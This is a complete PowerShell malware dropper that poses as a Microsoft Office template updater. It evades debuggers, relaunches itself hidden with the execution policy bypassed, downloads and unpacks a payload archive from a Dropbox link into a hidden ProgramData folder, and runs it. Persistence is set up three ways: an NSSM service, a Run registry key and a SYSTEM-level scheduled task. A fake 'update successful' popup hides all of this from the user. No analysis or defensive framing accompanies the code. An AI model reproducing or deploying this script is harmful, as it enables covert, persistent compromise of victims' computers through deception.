

function Test-Debugger {
    try {
        $isDebugged = $false
        $signature = @"
            [DllImport("kernel32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
            public static extern bool IsDebuggerPresent();
            
            [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
            public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool pbDebuggerPresent);
"@
        $debugAPI = Add-Type -MemberDefinition $signature -Name "DebugUtils" -Namespace "AntiDebug" -PassThru
        if ($debugAPI::IsDebuggerPresent()) { return $true }
        $debugAPI::CheckRemoteDebuggerPresent([System.Diagnostics.Process]::GetCurrentProcess().Handle, [ref]$isDebugged)
        return $isDebugged
    }
    catch { return $false }
}

function Test-ProcessRunning($processName) {
    try {
        return [bool](Get-Process -Name $processName -ErrorAction SilentlyContinue)
    }
    catch { return $false }
}

function Add-ToPath($dir) {
    try {
        $currentPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
        if ($currentPath -notlike "*$dir*") {
            $newPath = $currentPath + ";" + $dir
            [Environment]::SetEnvironmentVariable("Path", $newPath, "Machine")
            
            # Notify system of environment change
            $signature = @"
                [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
                public static extern IntPtr SendMessageTimeout(
                    IntPtr hWnd,
                    uint Msg,
                    UIntPtr wParam,
                    string lParam,
                    uint fuFlags,
                    uint uTimeout,
                    out UIntPtr lpdwResult);
"@
            $msgAPI = Add-Type -MemberDefinition $signature -Name "Win32Msg" -Namespace "Win32" -PassThru
            $HWND_BROADCAST = [IntPtr]0xffff
            $WM_SETTINGCHANGE = 0x1A
            $SMTO_ABORTIFHUNG = 0x0002
            $null = $msgAPI::SendMessageTimeout($HWND_BROADCAST, $WM_SETTINGCHANGE, [UIntPtr]::Zero, "Environment", $SMTO_ABORTIFHUNG, 5000, [out][UIntPtr]::Zero)
        }
    }
    catch { }
}

function Create-ScheduledTask($exePath, $taskName) {
    try {
        $action = New-ScheduledTaskAction -Execute $exePath -Argument "--background"
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Principal $principal -TaskName $taskName -Description "Microsoft Office Templates Updater" -Force
    }
    catch { }
}

function Execute-Payload {
    $procName = "Microsoft@OfficeTempletes"
    $dirPath = "$env:ProgramData\Microsoft\Windows\Templates\mall"
    $exeName = "Microsoft@OfficeTempletes.exe"
    $nssmName = "nssm.exe"
    $configName = "config.json"
    $zipName = "mall.zip"
    $urlStr = "https://www.dropbox.com/scl/fi/4ni8nstmgz877gf3nt1a3/mall.zip?rlkey=o4n3iyuw2w7kpojy9nv88aguo&st=l15q7e53&dl=1"
    $svcName = "Microsoft Service"
    $svcDesc = "Microsoft Office Template Service"
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "OfficeTemplates"
    $taskName = "Microsoft Office Templates Updater"
    $successMsg = "Microsoft Office components updated successfully"

    if (Test-ProcessRunning -processName $procName) { return }

    if (-not (Test-Path -Path $dirPath)) {
        $null = New-Item -Path $dirPath -ItemType Directory -Force
        (Get-Item $dirPath).Attributes = "Hidden,System"
    }

    $exePath = Join-Path $dirPath $exeName
    $nssmPath = Join-Path $dirPath $nssmName
    $configPath = Join-Path $dirPath $configName
    $zipPath = Join-Path $dirPath $zipName

    if (-not (Test-Path -Path $exePath)) {
        try {
            Invoke-WebRequest -Uri $urlStr -OutFile $zipPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
            Expand-Archive -Path $zipPath -DestinationPath $dirPath -Force
            Remove-Item -Path $zipPath -Force
        }
        catch { }

        if (Test-Path $exePath) {
            (Get-Item $exePath).Attributes = "Hidden,System"
            (Get-Item $nssmPath).Attributes = "Hidden,System"
            (Get-Item $configPath).Attributes = "Hidden,System"
        }
    }

    Add-ToPath -dir $dirPath

    if (Test-Path $nssmPath) {
        try {
            Start-Process -FilePath $nssmPath -ArgumentList "install `"$svcName`" `"$exePath`" --config=`"$configPath`"" -Wait -WindowStyle Hidden
            Start-Process -FilePath $nssmPath -ArgumentList "set `"$svcName`" Description `"$svcDesc`"" -Wait -WindowStyle Hidden
            Start-Process -FilePath $nssmPath -ArgumentList "start `"$svcName`"" -Wait -WindowStyle Hidden
        }
        catch { }
    }

    try {
        $regValue = "`"$exePath`" --background"
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
    }
    catch { }

    Create-ScheduledTask -exePath $exePath -taskName $taskName

    if (Test-Path $exePath) {
        Start-Process -FilePath $exePath -ArgumentList "--background" -WindowStyle Hidden
    }

    $wshell = New-Object -ComObject Wscript.Shell
    $wshell.Popup($successMsg, 3, "Microsoft Office Update", 0x40)
}

# Main execution
if (Test-Debugger) { exit }

$delay = Get-Random -Minimum 5 -Maximum 16
Start-Sleep -Seconds $delay

if (-not $args.Contains("hidden")) {
    $scriptPath = $MyInvocation.MyCommand.Path
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" hidden"
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    exit
}

Execute-Payload